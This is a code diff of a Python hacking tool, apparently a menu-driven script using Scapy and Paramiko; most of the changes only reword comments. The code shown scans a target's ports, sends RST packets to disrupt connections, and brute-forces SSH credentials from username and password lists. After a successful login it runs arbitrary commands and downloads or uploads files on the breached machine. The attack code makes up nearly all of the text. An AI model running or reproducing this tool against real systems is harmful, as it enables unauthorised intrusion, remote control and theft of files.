@@ -7,32 +7,32 @@ import time
 
 # Definitions. Check if Target is available.
 def check_ip(ip):
-    # Check that the Target is reachable.
+    # Try statement.
     try:
         # Verbose configuration.
         conf.verb = 0
-        # ICMP packet. Ping.
+        # ICMP packet.
         icmp_pkt = IP(dst=ip) / ICMP()
-        # Ping.
+        # Check if Target is available.
         if icmp_pkt is not None:
-            # Print result.
+            # Print results.
             print(f"\n[+] Target {ip} is available.")
-            # Send ICMP packet.
+            # Print and send results.
             print(f"[+] Sending ICMP packet to {ip}...\n"
                   f"{print(send(icmp_pkt, verbose=0))}")
             # Check if packet was sent successfully and received.
             icmp_result = icmp_pkt.show()
-            # Print result.
+            # Print results.
             print("[+] ICMP result:"
                   f"\n{icmp_result}")
-            # Return value.
+            # Return values.
             return True
     # Error handling.
     except Exception as error:
         # Print error.
         print(f"\n[-] Target {ip} is unreachable."
               f"\n[-] Error: {error}")
-        # Return value.
+        # Return values.
         return False
 
 
@@ -42,7 +42,7 @@ def scan_port(port):
     src_port = RandShort()
     # Verbose configuration.
     conf.verb = 0
-    # Packets.
+    # SYN/ACK packet.
     syn_pkt = sr1(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
     # Scan for open ports. Check all possible ports, flags and layers.
     if syn_pkt is not None:
@@ -60,37 +60,43 @@ def scan_port(port):
                 if syn_pkt.getlayer(TCP).flags == 0x2:
                     # Print results.
                     print(f"[+] Port {port} has SYN flag.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # Check all possible.flags values.
                 elif syn_pkt.getlayer(TCP).flags == 0x10:
                     # Print results.
                     print(f"[+] Port {port} has ACK flag.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # Check all possible.flags values.
                 elif syn_pkt.getlayer(TCP).flags == 0x12:
                     # Print results.
                     print(f"[+] Port {port} has SYN/ACK flag.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # There is no flags.
                 else:
                     # Print results.
                     print(f"[-] Port {port} does not have SYN, ACK or SYN/ACK flag.\n")
-                    # Return value.
+                    # Return values.
                     return False
+            # There is no SYN flag.
             else:
                 # Print results.
                 print(f"[-] Port {port} does not have 'SA' flag.\n")
-                # Return value.
+                # Return values.
                 return False
+        # There is no TCP layer.
         else:
             # Print results.
             print(f"[-] Port {port} does not have TCP layer.\n")
-            # Return value.
+            # Return values.
             return False
+    # There is no SYN/ACK packet.
     else:
         # Print results.
         print(f"[-] Port {port} is closed.\n")
-        # Return value.
+        # Return values.
         return False
 
 
@@ -100,7 +106,7 @@ def close_port(port):
     src_port = RandShort()
     # Verbose configuration.
     conf.verb = 0
-    # Packets.
+    # RST packet.
     syn_pkt = sr1(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
     # Scan for open ports. Check all possible ports, flags and layers.
     if syn_pkt is not None:
@@ -124,8 +130,9 @@ def close_port(port):
                     send(rst_pkt, verbose=0)
                     # Print results.
                     print(f"[+] Port {port} successfully closed.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # Check all possible.flags values.
                 elif syn_pkt.getlayer(TCP).flags == 0x10:
                     # Print results.
                     print(f"[+] Port {port} has ACK flag.")
@@ -135,8 +142,9 @@ def close_port(port):
                     send(rst_pkt, verbose=0)
                     # Print results.
                     print(f"[+] Port {port} successfully closed.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # Check all possible.flags values.
                 elif syn_pkt.getlayer(TCP).flags == 0x12:
                     # Print results.
                     print(f"[+] Port {port} has SYN/ACK flag.")
@@ -146,34 +154,39 @@ def close_port(port):
                     send(rst_pkt, verbose=0)
                     # Print results.
                     print(f"[+] Port {port} successfully closed.\n")
-                    # Return value.
+                    # Return values.
                     return True
+                # There is no flags.
                 else:
                     # Print results.
                     print(f"[-] Port {port} does not have SYN, ACK or SYN/ACK flag.\n")
-                    # Return value.
+                    # Return values.
                     return False
+            # There is no SYN flag.    
             else:
                 # Print results.
                 print(f"[-] Port {port} does not have 'SA' flag.\n")
-                # Return value.
+                # Return values.
                 return False
+        # There is no TCP layer.
         else:
             # Print results.
             print(f"[-] Port {port} does not have TCP layer.\n")
-            # Return value.
+            # Return values.
             return False
+    # There is no SYN/ACK packet to send RST packet.    
     else:
         # Print results.
         print(f"[-] Port {port} is closed.\n")
-        # Return value.
+        # Return values.
         return False
 
 
 # Definitions. Brute force function.
 def brute_force(hostname, port, username, password, sock):
-    # Connecting to server. Trying all combinations.
+    # Print the combination massages.
     print("\n[+] Executing one of the combinations...")
+    # Connect to the Target.
     ssh_paramiko_client.connect(hostname=hostname,
                                 port=port,
                                 username=username,
@@ -186,29 +199,29 @@ def brute_force(hostname, port, username, password, sock):
           f"\nPassword: {password}"
           f"\nTarget IP address: {target_ip}"
           f"\nPort: {open_port}")
-    # Return value.
+    # Return values.
     return True
 
 
 # Definitions. Execute command function.
 def execute_command(command):
-    # Print result.
+    # Print executing massages.
     print("\nExecuting command...\n")
     # Execute command.
     stdin, stdout, stderr = \
         ssh_paramiko_client.exec_command(command)
-    # Print result.
+    # Print results.
     print("[+] Successfully executed command:"
           f"\n{stdout.read().decode('utf-8')}")
     # Return to Main Menu.
-    print("[+] Returning to main menu...")
-    # Return value.
+    print("\n[+] Returning to main menu...\n")
+    # Return values.
     return True
 
 
 # Definitions. Download file function.
 def download_file(host_file_path, target_file_path):
-    # Print result.
+    # Print progress massages.
     print("\n[+] Please be patient! Downloading...\n")
     # Open a file.
     host_file_name = open(host_file_path, "wb")
@@ -216,22 +229,22 @@ def download_file(host_file_path, target_file_path):
     sftp = ssh_paramiko_client.open_sftp()
     # Download file.
     sftp.getfo(target_file_path, host_file_name)
-    # Print result.
+    # Print results.
     print("[+] Successfully downloaded:"
           f"\nfrom: {target_file_path}"
           f"\nto: {host_file_path}")
     # Close the file and connection.
     host_file_name.close()
     sftp.close()
-    # Print result.
+    # Print results.
     print("\n[+] Returning to main menu...\n")
-    # Return value.
+    # Return values.
     return True
 
 
 # Definitions. Upload file function.
 def upload_file(host_file_path, target_file_path):
-    # Print result.
+    # Print progress massages.
     print("\n[+] Please be patient! Uploading...\n")
     # Open a file.
     host_file_name = open(host_file_path, "rb")
@@ -246,9 +259,9 @@ def upload_file(host_file_path, target_file_path):
     # Close the file and connection.
     host_file_name.close()
     sftp.close()
-    # Print result.
+    # Print results.
     print("\n[+] Returning to main menu...\n")
-    # Return value.
+    # Return values.
     return True
 
 
@@ -305,6 +318,7 @@ if __name__ == "__main__":
                             if scan_port(port):
                                 # Add port to list.
                                 open_ports.append(port)
+                            # Go to else statement.
                             else:
                                 # Add port to list.
                                 close_ports.append(port)
@@ -336,6 +350,7 @@ if __name__ == "__main__":
                                     if close_port(port):
                                         # Add port to list.
                                         closed_ports_by_rst_pkt.append(port)
+                                    # Go to else statement.
                                     else:
                                         # Add port to list.
                                         closed_ports.append(port)
@@ -348,7 +363,7 @@ if __name__ == "__main__":
                             if third_menu == "2":
                                 # Proxy configuration.
                                 proxy = None
-                                # SSH client.
+                                # SSH client variables and configuration.
                                 ssh_paramiko_client = paramiko.SSHClient()
                                 ssh_paramiko_client.load_system_host_keys()
                                 ssh_paramiko_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -373,8 +388,9 @@ if __name__ == "__main__":
                                 for username in usernames:
                                     # Passwords loop.
                                     for password in passwords:
+                                        # Set timeout for password loop.
                                         time.sleep(0.2)
-                                        # Try statement.
+                                        # Try statement. Brute force credentials.
                                         try:
                                             # Call brute_force function.
                                             brute_force(target_ip, open_port, username, password, proxy)
@@ -392,22 +408,24 @@ if __name__ == "__main__":
                                                 print("==================================================")
                                                 # Choice 1.
                                                 if fourth_menu == "1":
-                                                    # Try statement.
+                                                    # Try statement. Execute command on the Target.
                                                     try:
                                                         # Inputs.
                                                         command = input("Enter Command: ")
                                                         # Call execute_command function.
                                                         execute_command(command)
+                                                        # Continue processing.
                                                         continue
                                                     # Error handling.
                                                     except Exception as error:
                                                         # Print error.
                                                         print("[-] Unknown Error:"
                                                               f"\n{error}")
+                                                        # Continue processing.
                                                         continue
                                                 # Choice 2
                                                 elif fourth_menu == "2":
-                                                    # Try statement.
+                                                    # Try statement. Download file from the Target.
                                                     try:
                                                         # Inputs.
                                                         host_download_file_path = input(
@@ -417,16 +435,18 @@ if __name__ == "__main__":
                                                         # Call download_file function.
                                                         download_file(host_download_file_path,
                                                                       target_download_file_path)
+                                                        # Continue processing.
                                                         continue
                                                     # Error handling.
                                                     except Exception as error:
                                                         # Print error.
                                                         print("[-] Unknown Error:"
                                                               f"\n{error}")
+                                                        # Continue processing.
                                                         continue
                                                 # Choice 3
                                                 elif fourth_menu == "3":
-                                                    # Try statement.
+                                                    # Try statement. Upload file to the Target.
                                                     try:
                                                         # Inputs.
                                                         host_upload_file_path = input(
@@ -436,22 +456,26 @@ if __name__ == "__main__":
                                                         # Call upload_file function.
                                                         upload_file(host_upload_file_path,
                                                                     target_upload_file_path)
+                                                        # Continue processing.
                                                         continue
                                                     # Error handling.
                                                     except Exception as error:
                                                         # Print error.
                                                         print("[-] Unknown Error:"
                                                               f"\n{error}")
+                                                        # Continue processing.
                                                         continue
                                                 # Choice 4
                                                 elif fourth_menu == "4":
                                                     # Print results.
                                                     print("\n[+] Quitting...")
+                                                    # Break the loop.
                                                     break
                                                 # Invalid choice.
                                                 else:
                                                     # Invalid choice.
                                                     print("\n[-] Invalid choice!")
+                                                    # Continue to the next loop.
                                                     continue
                                             # Breaking the loop.
                                             break
@@ -470,8 +494,9 @@ if __name__ == "__main__":
                                             # Print error.
                                             print("[-] Unknown Error:\n"
                                                   f"\n{error}")
-                                    # Else statement.
+                                    # Else statement. Continue to the next loop.
                                     else:
+                                        # Continue to the next loop.
                                         continue
                                     # Breaking the loop.
                                     break
@@ -482,39 +507,46 @@ if __name__ == "__main__":
                             elif third_menu == "3":
                                 # Print results.
                                 print("\n[+] Quitting...")
-                                # Break loop.
+                                # Break the loop.
                                 break
-                            # Error handling.
+                            # Invalid choice.
                             else:
                                 # Print error message.
                                 print("\n[-] Invalid choice!")
+                                # Continue to the next loop.
                                 continue
-                            # Break loop.
+                            # Break the loop.
                             break
                     # Choice 2.
                     elif second_menu == "2":
                         # Print results.
                         print("\n[+] Quitting...")
+                        # Break the loop.
                         break
-                    # Error handling.
+                    # Invalid choice.
                     else:
                         # Print error message.
                         print("\n[-] Invalid choice!")
+                        # Continue to the next loop.
                         continue
-                    # Break loop.
+                    # Break the loop.
                     break
-            # Error handling.
+            # Something went wrong.
             else:
                 # Print error message.
                 print("\n[-] Something went wrong! Invalid IP address or Target is not available.")
+                # Continue to the next loop.
                 continue
         # Choice 2.
         elif first_menu == "2":
             # Print results
             print("\n[+] Quitting...")
+            # Break the loop.
             break
-        # Error handling.
+        # Invalid choice.
         else:
             # Print error message.
             print("\n[-] Invalid choice!")
+            # Continue to the next loop.
             continue
+            
